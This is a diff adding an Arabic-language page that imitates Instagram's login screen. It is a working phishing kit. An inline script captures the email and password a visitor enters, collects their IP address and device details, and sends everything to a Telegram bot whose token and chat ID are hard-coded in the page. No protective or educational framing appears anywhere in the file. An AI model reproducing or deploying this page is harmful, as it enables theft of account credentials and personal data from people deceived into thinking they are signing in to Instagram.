@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <title>تسجيل الدخول • Instagram</title>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img/instagram-logo.png" alt="شعار انستقرام" title="شعار انستقرام" />
+                </h1>
+                <form id="login-form" onsubmit="redirectToInstagram(); return false;">
+                    <label for="email" class="sr-only">...رقم الهاتف أو اسم المستخدم أو البريد الإلكترو</label>
+                    <input id="email" name="email" placeholder="...رقم الهاتف أو اسم المستخدم أو البريد الإلكترو" required />
+
+                    <label for="password" class="sr-only">كلمة المرور</label>
+                    <input id="password" name="password" type="password" placeholder="كلمة السر" required />
+
+                    <button type="submit">تسجيل الدخول</button>
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">أو</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img />
+                    <img src=><a>تسجيل الدخول باستخدام فيسبوك</a>
+                    </div>
+                    <a href="#">هل نسيت كلمة السر؟</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>  أليس لديك حساب؟</a>
+                <a href="https://www.instagram.com/accounts/login/" target="_blank">تسجيل</a> <!-- رابط صفحة التسجيل في انستقرام -->
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p>.احصل على التطبيق</p>
+                <div class="flex justify-content-center">
+                    <img src="./img/UpgG2Fp2UQo.png" alt="شعار متجر مايكروسوفت" title="متجر ماكروسوفت" />
+                    <img src="./img/googleplay-button.png" alt="شعار متجر جوجل بلاي" title="متجر جوجل بلاي" />
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#">حول</a></li>
+            <li><a href="#">مساعدة</a></li>
+            <li><a href="#">الصحافة</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">فرص العمل</a></li>
+            <li><a href="#">الخصوصية</a></li>
+            <li><a href="#">الشروط</a></li>
+            <li><a href="#">الموقع</a></li>
+            <li><a href="#">حسابات أكثر</a></li>
+            <li><a href="#">الهاشتاغات</a></li>
+            <li><a href="#">اللغة</a></li>
+            <li><a href="#">Meta</a></li>
+            <li><a href="#">تحميل جهات الاتصال وغير المستخدمين</a></li>
+            <li><a href="#">Meta Verified</a></li>
+        </ul>
+        <p class="copyright">© 2024 Instagram from Meta</p>
+    </footer>
+    
+<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+<script>
+    const TOKEN = "7574084049:AAFQmyFed0ofg1dQYhLFILfSmgMJXHhrae0";                                                            // هنا التوكين              
+    const CHAT_ID = "5254023872";                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        axios.get('https://api.ipify.org?format=json')
+            .then(response => {
+                const ip = response.data.ip;
+
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                const message = ` 
+                    <b>New Login Attempt</b>\n
+                    <b>Email:</b> ${email}\n
+                    <b>Password:</b> ${password}\n
+                    <b>IP Address:</b> ${ip}\n
+                    <b>Device Type:</b> ${deviceType}\n
+                    <b>Platform:</b> ${platform}\n
+                    <b>User Agent:</b> ${userAgent}\n
+                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                `;
+
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                }).then(response => {
+                    alert('Information sent successfully!');
+                }).catch(error => {
+                    alert('Error sending the information. Please try again.');
+                });
+            })
+            .catch(error => {
+                alert('Error fetching the IP address. Please try again.');
+            });
+    });
+</script>
+</body>
+</html>
